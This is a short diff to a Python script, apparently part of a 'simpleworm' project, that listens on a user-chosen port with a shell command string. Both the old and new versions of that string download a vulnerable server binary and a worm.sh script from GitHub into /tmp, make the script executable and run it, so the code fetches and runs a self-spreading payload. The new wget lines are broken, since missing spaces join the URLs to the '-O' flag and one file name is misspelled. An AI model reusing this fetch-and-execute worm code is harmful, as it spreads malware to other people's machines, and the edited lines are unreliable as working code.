@@ -5,10 +5,10 @@ import subprocess
 port = int(input("Enter port: "))
 
 shell_commands = (
-    "curl -o /tmp/vulserver https://raw.githubusercontent.com/paultheal1en/simpleworm/main/vul_server"
-    "; sleep 3;"
-    "curl -o /tmp/worm.sh https://raw.githubusercontent.com/paultheal1en/simpleworm/main/worm.sh"
-    "; sleep 3; chmod +x /tmp/worm.sh; /tmp/worm.sh\n"
+    "wget https://raw.githubusercontent.com/paultheal1en/simpleworm/main/vul_server"
+    "-O /tmp/vulserser; sleep 3;" 
+    "wget https://raw.githubusercontent.com/paultheal1en/simpleworm/main/worm.sh"
+    "-O /tmp/worm.sh; sleep 3; chmod +x /tmp/worm.sh; /tmp/worm.sh\n"
 )
 
 print("[+] Listening on port {}...".format(port))
